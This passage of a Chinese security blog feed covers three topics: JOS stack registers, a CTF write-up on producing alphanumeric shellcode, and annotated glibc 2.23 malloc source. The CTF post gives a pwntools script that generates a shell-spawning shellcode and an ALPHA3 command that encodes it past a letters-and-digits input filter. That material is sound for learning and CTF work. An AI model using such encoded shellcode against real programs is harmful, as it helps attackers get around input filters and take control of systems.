monitor子程序。这个程序可以记录堆栈的变化轨迹：轨迹是由一系列被保存到堆栈的IP寄存器的值组成的，之所以会产生这一系列被保存的IP寄存器的值，是因为我们执行了一个程序，程序中包括一系列嵌套的call指令。</p><p><strong>%esp寄存器</strong>指向的是整个堆栈中正在被使用的部分的最低地址。在这个地址之下的更低的地址空间都是还没有被利用的堆栈空间。当计算机要完成把一个值压入堆栈的动作时，通常它需要先把堆栈指针寄存器中的值减1（有时候是减4，由机器字长决定），然后把需要压入的值存放到当前堆栈指针寄存器所指向的新的内存单元。而从堆栈中弹出一个值的操作，则需要计算机首先从堆栈寄存器所指向的内存单元读取一个数据，然后把堆栈寄存器的值加1（有时候是加4）。在32bit模式下，每一次对堆栈的操作都是以32bit为单位的，所以%esp中的值永远都是可以被4整除的。</p><p><strong>ebp寄存器</strong>则是记录每一个程序的栈帧的相关信息的一个非常重要的寄存器。每一个程序在运行时都会分配给它一个栈帧，用于实现存放一些临时变量，传递参数给它调用的子函数等等功能。当现在进入某个子程序时，最先要运行的代码就是先把之前调用这个子程序的程序的ebp寄存器的值压入堆栈中保存起来，然后把ebp寄存器的值更新为当前esp寄存器的值。此时就相当于为这个子程序定义了它的ebp寄存器的值，也就是它栈帧的一个边界。只要所有的程序都遵循这样的编程规则，那么当我们运行到程序的任意一点时。我们可以通过在堆栈中保存的一系列ebp寄存器的值来回溯，弄清楚是怎样的一个函数调用序列使我们的程序运行到当前的这个点。</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>关于纯字符shellcode的编写</title>
      <link>https://billyotry.github.io/2021/01/22/%E5%85%B3%E4%BA%8E%E7%BA%AF%E5%AD%97%E7%AC%A6shellcode%E7%9A%84%E7%BC%96%E5%86%99/</link>
      <guid>https://billyotry.github.io/2021/01/22/%E5%85%B3%E4%BA%8E%E7%BA%AF%E5%AD%97%E7%AC%A6shellcode%E7%9A%84%E7%BC%96%E5%86%99/</guid>
      <pubDate>Thu, 21 Jan 2021 16:59:43 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;在上次MRCTF的时候遇到了一题，虽然只需要输入shellcode，但是对用户的输入字符进行了限制，只能有字母和数字这些可见字符。&lt;strong&gt;在此感谢TaQini师傅对于alphanumeric shellcode编写的指导！&lt;/strong&gt;具体参考TaQini师傅的
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>在上次MRCTF的时候遇到了一题，虽然只需要输入shellcode，但是对用户的输入字符进行了限制，只能有字母和数字这些可见字符。<strong>在此感谢TaQini师傅对于alphanumeric shellcode编写的指导！</strong>具体参考TaQini师傅的文章</p><p><a href='http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode'>纯字符shellcode生成指南</a></p><p>关键部分:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (i &lt; len) </span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">if</span> (((((<span class="keyword">char</span>)buf[i] &lt; <span class="string">&#x27;a&#x27;</span>) || (<span class="string">&#x27;z&#x27;</span> &lt; (<span class="keyword">char</span>)buf[i])) &amp;&amp;</span><br><span class="line">          (((<span class="keyword">char</span>)buf[i] &lt; <span class="string">&#x27;A&#x27;</span> || (<span class="string">&#x27;Z&#x27;</span> &lt; (<span class="keyword">char</span>)buf[i])))) &amp;&amp;</span><br><span class="line">         (((<span class="keyword">char</span>)buf[i] &lt; <span class="string">&#x27;0&#x27;</span> || (<span class="string">&#x27;Z&#x27;</span> &lt; (<span class="keyword">char</span>)buf[i])))) </span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I Can\&#x27;t Read This!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      i = i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">buf();     <span class="comment">//可以看到程序会将我们的输入当成函数执行</span></span><br></pre></td></tr></table></figure><p>我们可以使用alpha3来将pwntools生成shellcode来转为alphanumeric shellcode.</p><p><code>1.python ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc&quot;</code></p><p>在使用这条命令前我们还需要有pwntools生成的shellcode</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename  sc.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">str</span>(shellcode)</span><br></pre></td></tr></table></figure><p>如何将文件的输出输出到sc文件中(不能输出到终端复制过去,有不可见字符)</p><p><code>2.python sc.py &gt; sc</code></p><p>然后我们就可以用1命令生成alphanumeric shellcode(这里的shellcode是会输出的终端,如果你想输出到文件中的话可以去翻官方文档)        ——-&gt;         <a href='https://github.com/SkyLined/alpha3 '>alpha3</a></p><p><img src="https://i.loli.net/2020/04/15/Wi9Jhe4L1NdfDwq.png" alt="QQ图片20200415000820.png"></p><p>   Note:这里要还有要注意一个寄存器的问题,因为这里buf函数是<code>call rax</code>所以我们的1命令中使用<code>rax</code>.</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/%E5%85%B3%E4%BA%8E%E7%BA%AF%E5%AD%97%E7%AC%A6shellcode%E7%9A%84%E7%BC%96%E5%86%99/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【Glibc 源码分析】Glibc 2.23 -- malloc.c</title>
      <link>https://billyotry.github.io/2021/01/22/%E3%80%90Glibc%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E3%80%91Glibc%202.23%20--%20malloc.c/</link>
      <guid>https://billyotry.github.io/2021/01/22/%E3%80%90Glibc%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E3%80%91Glibc%202.23%20--%20malloc.c/</guid>
      <pubDate>Thu, 21 Jan 2021 16:59:43 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;源码来自:&lt;a href=&quot;https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c&quot;&gt;https://elixir.bootlin.com/glibc/glibc-2.23/source/mall
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>源码来自:<a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c">https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c</a></p><h2 id="MMAP-support"><a href="#MMAP-support" class="headerlink" title="MMAP support"></a>MMAP support</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ------------------ MMAP support ------------------  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !defined(MAP_ANONYMOUS) &amp;&amp; defined(MAP_ANON)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAP_ANONYMOUS MAP_ANON</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MAP_NORESERVE</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAP_NORESERVE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MMAP(addr, size, prot, flags) \</span></span><br><span class="line"> __mmap((addr), (size), (prot), (flags)|MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2 id="Chunk-representations"><a href="#Chunk-representations" class="headerlink" title="Chunk representations"></a>Chunk representations</h2><h3 id="malloc-chunk-结构体"><a href="#malloc-chunk-结构体" class="headerlink" title="malloc_chunk 结构体"></a>malloc_chunk 结构体</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  -----------------------  Chunk representations -----------------------</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们在前面可以看见<code>#define INTERNAL_SIZE_T size_t</code>也就是说在64位的机器上，这个类型就是<code>unsigned long</code>类型</p><p>prev_size： 如果前一个块处于空闲状态，那么该值为前一个块的大小</p><p>size：记录当前块的大小</p><p>fd：当前块空闲时指向后一个空闲的chunk</p><p>bk：当前块空闲时指向前一个空闲的chunk</p><p>fd_nextsize：记录 large bin 的前驱节点</p><p>bk_nextsize：记录 large bin 的后继节点</p><h3 id="malloc-chunk-的细节"><a href="#malloc-chunk-的细节" class="headerlink" title="malloc_chunk 的细节"></a>malloc_chunk 的细节</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   malloc_chunk details:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    (The following includes lightly edited explanations by Colin Plumb.)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks of memory are maintained using a `boundary tag&#x27; method as</span></span><br><span class="line"><span class="comment">    described in e.g., Knuth or Standish.  (See the paper by Paul</span></span><br><span class="line"><span class="comment">    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a</span></span><br><span class="line"><span class="comment">    survey of such techniques.)  Sizes of free chunks are stored both</span></span><br><span class="line"><span class="comment">    in the front of each chunk and at the end.  This makes</span></span><br><span class="line"><span class="comment">    consolidating fragmented chunks into bigger chunks very fast.  The</span></span><br><span class="line"><span class="comment">    size fields also hold bits representing whether chunks are free or</span></span><br><span class="line"><span class="comment">    in use.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    An allocated chunk looks like this:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Size of previous chunk, if allocated            | |</span></span><br><span class="line"><span class="comment">       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Size of chunk, in bytes                       |M|P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             User data starts here...                          .</span></span><br><span class="line"><span class="comment">       .                                                               .</span></span><br><span class="line"><span class="comment">       .             (malloc_usable_size() bytes)                      .</span></span><br><span class="line"><span class="comment">       .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Size of chunk                                     |</span></span><br><span class="line"><span class="comment">       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Where &quot;chunk&quot; is the front of the chunk for the purpose of most of</span></span><br><span class="line"><span class="comment">    the malloc code, but &quot;mem&quot; is the pointer that is returned to the</span></span><br><span class="line"><span class="comment">    user.  &quot;Nextchunk&quot; is the beginning of the next contiguous chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks always begin on even word boundaries, so the mem portion</span></span><br><span class="line"><span class="comment">    (which is returned to the user) is also on an even word boundary, and</span></span><br><span class="line"><span class="comment">    thus at least double-word aligned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Free chunks are stored in circular doubly-linked lists, and look like this:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Size of previous chunk                            |</span></span><br><span class="line"><span class="comment">       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    `head:&#x27; |             Size of chunk, in bytes                         |P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Forward pointer to next chunk in list             |</span></span><br><span class="line"><span class="comment">       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Back pointer to previous chunk in list            |</span></span><br><span class="line"><span class="comment">       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Unused space (may be 0 bytes long)                .</span></span><br><span class="line"><span class="comment">       .                                                               .</span></span><br><span class="line"><span class="comment">       .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    `foot:&#x27; |             Size of chunk, in bytes                           |</span></span><br><span class="line"><span class="comment">       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The P (PREV_INUSE) bit, stored in the unused low-order bit of the</span></span><br><span class="line"><span class="comment">    chunk size (which is always a multiple of two words), is an in-use</span></span><br><span class="line"><span class="comment">    bit for the *previous* chunk.  If that bit is *clear*, then the</span></span><br><span class="line"><span class="comment">    word before the current chunk size contains the previous chunk</span></span><br><span class="line"><span class="comment">    size, and can be used to find the front of the previous chunk.</span></span><br><span class="line"><span class="comment">    The very first chunk allocated always has this bit set,</span></span><br><span class="line"><span class="comment">    preventing access to non-existent (or non-owned) memory. If</span></span><br><span class="line"><span class="comment">    prev_inuse is set for any given chunk, then you CANNOT determine</span></span><br><span class="line"><span class="comment">    the size of the previous chunk, and might even get a memory</span></span><br><span class="line"><span class="comment">    addressing fault when trying to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Note that the `foot&#x27; of the current chunk is actually represented</span></span><br><span class="line"><span class="comment">    as the prev_size of the NEXT chunk. This makes it easier to</span></span><br><span class="line"><span class="comment">    deal with alignments etc but can be very confusing when trying</span></span><br><span class="line"><span class="comment">    to extend or adapt this code.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The two exceptions to all this are</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     1. The special chunk `top&#x27; doesn&#x27;t bother using the</span></span><br><span class="line"><span class="comment">   trailing size field since there is no next contiguous chunk</span></span><br><span class="line"><span class="comment">   that would have to index off it. After initialization, `top&#x27;</span></span><br><span class="line"><span class="comment">   is forced to always exist.  If it would become less than</span></span><br><span class="line"><span class="comment">   MINSIZE bytes long, it is replenished.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     2. Chunks allocated via mmap, which have the second-lowest-order</span></span><br><span class="line"><span class="comment">   bit M (IS_MMAPPED) set in their size fields.  Because they are</span></span><br><span class="line"><span class="comment">   allocated one-by-one, each must contain its own trailing size field.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="Size-and-alignment-checks-and-conversions"><a href="#Size-and-alignment-checks-and-conversions" class="headerlink" title="Size and alignment checks and conversions"></a>Size and alignment checks and conversions</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* conversion from malloc headers to user pointers, and back */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br></pre></td></tr></table></figure><p>该宏的作用是找到堆块 p 内用来存储 fd 指针的地址</p><p>说白了 <code>p</code> 就是用来存储当前堆块 <code>prev_size</code> 的地址，但是我们要的不是存储当前堆块 <code>prev_size</code> 和 <code>size</code> 的地址</p><p>用户输入的内容都是存储到<strong>那个存储 fd 指针的地址</strong>，也就是存储 size 的地址的下一个地址</p><p>fd 和 bk 都是在堆块空闲的时候才会存储在这个地址上，当堆块正在别使用的时候就是正常的存储区域</p><h3 id="mem2chunk-mem-宏"><a href="#mem2chunk-mem-宏" class="headerlink" title="mem2chunk(mem) 宏"></a>mem2chunk(mem) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></span><br></pre></td></tr></table></figure><p>该宏的作用和 <strong>chunk2mem 宏</strong>是反过来的</p><p>由堆块内用于给用户输入的存储区地址找到堆块的起始地址，也就是用于存储当前堆块 prev_size 的地址</p><h3 id="MIN-CHUNK-SIZE-宏"><a href="#MIN-CHUNK-SIZE-宏" class="headerlink" title="MIN_CHUNK_SIZE 宏"></a>MIN_CHUNK_SIZE 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br></pre></td></tr></table></figure><p>首先要了解 <strong>offsetof 宏</strong>的定义</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> offsetof(type,ident) ((size_t)&amp;(((type*)0)-&gt;ident))</span></span><br></pre></td></tr></table></figure><p>该宏通过一个结构体中的元素来获取该结构体的其实地址到该元素之间的距离</p><p>该宏的作用是规定一整个 chunk 的最小值是多少，包括 prev_size 域和 size 域</p><p>由此可以知道，在 32 位系统下，MIN_CHUNK_SIZE 的值大小是 0x10字节</p><p>在 64 位系统下，MIN_CHUNK_SIZE 的值大小是 0x20字节</p><h3 id="MINSIZE-宏"><a href="#MINSIZE-宏" class="headerlink" title="MINSIZE 宏"></a>MINSIZE 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE  \</span></span><br><span class="line">  (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br></pre></td></tr></table></figure><p>该宏用来规定最小的堆块的可用空间，也就是说申请的堆块至少有 MINSIZE 的大小</p><p>在 32 位下，MINSIZE 的值为0x10字节</p><p>在 64 位下，MINSIZE 的值为0x20字节</p><h3 id="aligned-OK-m-宏"><a href="#aligned-OK-m-宏" class="headerlink" title="aligned_OK(m) 宏"></a>aligned_OK(m) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Check if m has acceptable alignment */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br></pre></td></tr></table></figure><p>该宏用来判断申请到的堆块中的地址是否为对齐的地址</p><h3 id="misaligned-chunk-p-宏"><a href="#misaligned-chunk-p-宏" class="headerlink" title="misaligned_chunk(p) 宏"></a>misaligned_chunk(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> misaligned_chunk(p) \</span></span><br><span class="line">  ((<span class="keyword">uintptr_t</span>)(MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ ? (p) : chunk2mem (p)) \</span><br><span class="line">   &amp; MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure><p>如果 <code>MALLOC_ALIGNMENT == 2 * SIZE_SZ</code></p><p>即如果 <code>long double</code> 对齐所需要的字节大于 <code>2 * sizeof(size_t)</code></p><p>则返回 p 的地址，也就是堆块的起始地址；否则返回该堆块 fd 指针所在的地址</p><p>一般的架构返回 <code>chunk2mem (p)</code> 的</p><h3 id="REQUEST-OUT-OF-RANGE-req-宏（缺）"><a href="#REQUEST-OUT-OF-RANGE-req-宏（缺）" class="headerlink" title="REQUEST_OUT_OF_RANGE(req) 宏（缺）"></a>REQUEST_OUT_OF_RANGE(req) 宏（缺）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line">  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (req) &gt;=                         \</span><br><span class="line">   (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (INTERNAL_SIZE_T) (<span class="number">-2</span> * MINSIZE))</span><br></pre></td></tr></table></figure><p>待补充</p><h3 id="request2size-req-宏（缺）"><a href="#request2size-req-宏（缺）" class="headerlink" title="request2size(req) 宏（缺）"></a>request2size(req) 宏（缺）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure><p>待补充</p><h3 id="checked-request2size-req-sz-宏（缺）"><a href="#checked-request2size-req-sz-宏（缺）" class="headerlink" title="checked_request2size(req, sz) 宏（缺）"></a>checked_request2size(req, sz) 宏（缺）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)                             \</span></span><br><span class="line">  <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE (req)) &#123;                      \</span><br><span class="line">      __set_errno (ENOMEM);                         \</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;                               \</span><br><span class="line">    &#125;                                \</span><br><span class="line">  (sz) = request2size (req);</span><br></pre></td></tr></table></figure><p>待补充</p><h2 id="Physical-chunk-operations"><a href="#Physical-chunk-operations" class="headerlink" title="Physical chunk operations"></a>Physical chunk operations</h2><h3 id="PREV-INUSE-宏"><a href="#PREV-INUSE-宏" class="headerlink" title="PREV_INUSE 宏"></a>PREV_INUSE 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></span><br></pre></td></tr></table></figure><p>该宏的意思是当前堆块的前一个堆块处于非空闲状态，规定值为 0x1</p><h3 id="prev-inuse-p-宏"><a href="#prev-inuse-p-宏" class="headerlink" title="prev_inuse(p) 宏"></a>prev_inuse(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* extract inuse bit of previous chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;size &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></figure><p>检查前一个堆块是否处于空闲状态</p><p>如果前一个堆块处于非空闲状态，则返回 0x1，否则返回 0</p><h3 id="IS-MMAPPED-宏"><a href="#IS-MMAPPED-宏" class="headerlink" title="IS_MMAPPED 宏"></a>IS_MMAPPED 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2</span></span><br></pre></td></tr></table></figure><p>该宏的意思的当前的堆块是通过 mmap() 得到的</p><h3 id="chunk-is-mmapped-p-宏"><a href="#chunk-is-mmapped-p-宏" class="headerlink" title="chunk_is_mmapped(p) 宏"></a>chunk_is_mmapped(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* check for mmap()&#x27;ed chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)</span></span><br></pre></td></tr></table></figure><p>检查当前堆块是否是通过 mmap() 得到的</p><p>如果是 mmap() 得到的，那么返回 0x2，否则返回 0</p><h3 id="NON-MAIN-ARENA-宏"><a href="#NON-MAIN-ARENA-宏" class="headerlink" title="NON_MAIN_ARENA 宏"></a>NON_MAIN_ARENA 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span></span><br><span class="line"><span class="comment">   from a non-main arena.  This is only set immediately before handing</span></span><br><span class="line"><span class="comment">   the chunk to the user, if necessary.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br></pre></td></tr></table></figure><p>该宏的意思是当前 chunk 不属于主线程</p><h3 id="chunk-non-main-arena-p-宏"><a href="#chunk-non-main-arena-p-宏" class="headerlink" title="chunk_non_main_arena(p) 宏"></a>chunk_non_main_arena(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* check for chunk from non-main arena */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure><p>检查当前 chunk 是否属于主线程</p><p>如果不属于主线程，那么返回 0x4，否则返回 0</p><h3 id="SIZE-BITS-宏"><a href="#SIZE-BITS-宏" class="headerlink" title="SIZE_BITS 宏"></a>SIZE_BITS 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Bits to mask off when extracting size</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span></span><br><span class="line"><span class="comment">   macros for which mmapped chunks should never be seen. This should</span></span><br><span class="line"><span class="comment">   cause helpful core dumps to occur if it is tried by accident by</span></span><br><span class="line"><span class="comment">   people extending or adapting this malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure><p>表面看这个宏的返回值就是 7，也就是 <code>111B</code>，作用在下面的宏中有体现</p><h3 id="chunksize-p-宏"><a href="#chunksize-p-宏" class="headerlink" title="chunksize(p) 宏"></a>chunksize(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use 